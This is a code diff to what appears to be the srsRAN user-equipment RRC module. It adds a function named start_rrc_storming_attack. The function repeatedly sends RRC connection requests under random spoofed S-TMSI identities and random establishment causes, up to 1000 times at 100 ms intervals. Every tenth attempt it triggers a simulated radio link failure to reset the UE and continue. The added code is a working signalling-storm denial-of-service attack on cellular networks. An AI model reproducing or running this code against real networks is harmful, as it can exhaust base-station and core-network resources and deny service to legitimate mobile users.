@@ -40,6 +40,9 @@
 #include <math.h>
 #include <numeric>
 #include <string.h>
+#include <random>
+#include <thread>
+#include <chrono>
 
 std::atomic<bool> simulate_rlf{false};
 
@@ -3031,6 +3034,76 @@ void rrc::nr_scg_failure_information(const scg_failure_cause_t cause)
   scg_fail_info_nr.crit_exts.c1().scg_fail_info_nr_r15().fail_report_scg_nr_r15.fail_type_r15 =
       (fail_report_scg_nr_r15_s::fail_type_r15_opts::options)cause;
   send_ul_dcch_msg(srb_to_lcid(lte_srb::srb1), ul_dcch_msg);
+}
+
+void rrc::start_rrc_storming_attack()
+{
+  logger.info("Starting RRC Storming Attack...");
+  
+  // Attack parameters
+  const int max_attacks = 1000;  // Maximum number of attacks
+  const int attack_interval_ms = 100;  // Interval between attacks in milliseconds
+  
+  std::random_device rd;
+  std::mt19937 gen(rd());
+  std::uniform_int_distribution<uint32_t> tmsi_dist(0x00000000, 0xFFFFFFFF);
+  std::uniform_int_distribution<uint8_t> mmec_dist(0x00, 0xFF);
+  std::uniform_int_distribution<uint8_t> cause_dist(0, 7);  // Different establishment causes
+  
+  int attack_count = 0;
+  
+  while (attack_count < max_attacks && running) {
+    try {
+      // Generate random UE identity
+      srsran::s_tmsi_t random_tmsi;
+      random_tmsi.m_tmsi = tmsi_dist(gen);
+      random_tmsi.mmec = mmec_dist(gen);
+      
+      // Generate random establishment cause
+      srsran::establishment_cause_t cause = static_cast<srsran::establishment_cause_t>(cause_dist(gen));
+      
+      logger.info("RRC Storm Attack #%d: TMSI=0x%08x, MMEC=0x%02x, Cause=%d", 
+                 attack_count + 1, random_tmsi.m_tmsi, random_tmsi.mmec, (int)cause);
+      
+      // Set the random UE identity
+      set_ue_identity(random_tmsi);
+      
+      // Create a dummy NAS message for the connection request
+      srsran::unique_byte_buffer_t nas_msg = srsran::make_byte_buffer();
+      if (nas_msg) {
+        // Create a minimal NAS message (Service Request)
+        nas_msg->msg[0] = 0x2D;  // Service Request message type
+        nas_msg->msg[1] = 0x00;  // Service type: mobile originating calls
+        nas_msg->N_bytes = 2;
+        
+        // Send connection request
+        if (connection_request(cause, std::move(nas_msg))) {
+          logger.info("RRC Connection Request sent successfully");
+        } else {
+          logger.warning("Failed to send RRC Connection Request");
+        }
+      }
+      
+      attack_count++;
+      
+      // Wait before next attack
+      std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
+      
+      // Simulate going back to idle state by triggering RLF
+      if (attack_count % 10 == 0) {
+        logger.info("Simulating RLF to return to idle state");
+        simulate_rlf.store(true, std::memory_order_relaxed);
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+        simulate_rlf.store(false, std::memory_order_relaxed);
+      }
+      
+    } catch (const std::exception& e) {
+      logger.error("Exception in RRC storming attack: %s", e.what());
+      break;
+    }
+  }
+  
+  logger.info("RRC Storming Attack completed. Total attacks: %d", attack_count);
 }
 
 } // namespace srsue
